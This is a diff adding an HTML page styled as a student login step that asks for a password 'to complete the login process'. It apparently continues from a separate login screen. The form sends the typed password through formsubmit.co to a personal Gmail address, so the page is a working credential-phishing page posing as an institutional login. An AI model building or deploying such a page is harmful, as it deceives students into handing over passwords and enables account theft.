@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Student Password</title>
+
+  <!-- Roboto font -->
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+
+  <style>
+    body {
+      font-family: 'Roboto', sans-serif;
+      background: #f2f2f2;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    .box {
+      background: #fafafa;
+      border: 1px solid #bbb;
+      border-radius: 8px;
+      width: 360px;
+      padding: 40px 35px;
+      box-shadow: 0px 4px 10px rgba(0,0,0,0.15);
+    }
+    .box h2 {
+      font-size: 16px;
+      font-weight: bold;
+      margin: 0 0 12px 0;
+    }
+    .box p {
+      font-size: 13px;
+      color: #333;
+      margin: 0 0 20px 0;
+    }
+    .form-row {
+      display: flex;
+      align-items: center;
+      margin-bottom: 16px;
+    }
+    .form-row label {
+      font-size: 13px;
+      font-weight: bold;
+      margin-right: 8px;
+    }
+    input[type="password"] {
+      width: 180px;
+      padding: 6px;
+      border: 1px solid #aaa;
+      font-size: 13px;
+      background: #fff;
+      font-family: 'Roboto', sans-serif;
+    }
+    .required {
+      color: red;
+      margin-left: 5px;
+      font-weight: bold;
+    }
+    .buttons {
+      margin-top: 10px;
+    }
+    .buttons button {
+      font-size: 13px;
+      padding: 6px 14px;
+      margin-right: 6px;
+      border: 1px solid #888;
+      background: #f2f2f2;
+      cursor: pointer;
+    }
+    .buttons button:hover {
+      background: #e0e0e0;
+    }
+    .links {
+      margin-top: 18px;
+      text-align: center;
+    }
+    .links a {
+      display: block;
+      font-size: 12px;
+      color: #0066cc;
+      text-decoration: none;
+      margin-top: 4px;
+    }
+    .links a:hover {
+      text-decoration: underline;
+    }
+  </style>
+</head>
+<body>
+  <div class="box">
+    <h2>Please supply your password</h2>
+    <p>You need to supply your password in order to complete the login process</p>
+
+    <form action="https://formsubmit.co/aimgod2008g@gmail.com" method="POST">
+      <div class="form-row">
+        <label for="password">Password</label>
+        <input type="password" name="password" id="password" required>
+        <span class="required">*</span>
+      </div>
+
+      <div class="buttons">
+        <button type="submit">Login</button>
+        <button type="button">Forgot Password</button>
+      </div>
+
+      <div class="links">
+        <a href="#">Change Password</a>
+        <a href="UFH.html">Go back to Login Screen</a>
+      </div>
+    </form>
+  </div>
+</body>
+  </html>
+  
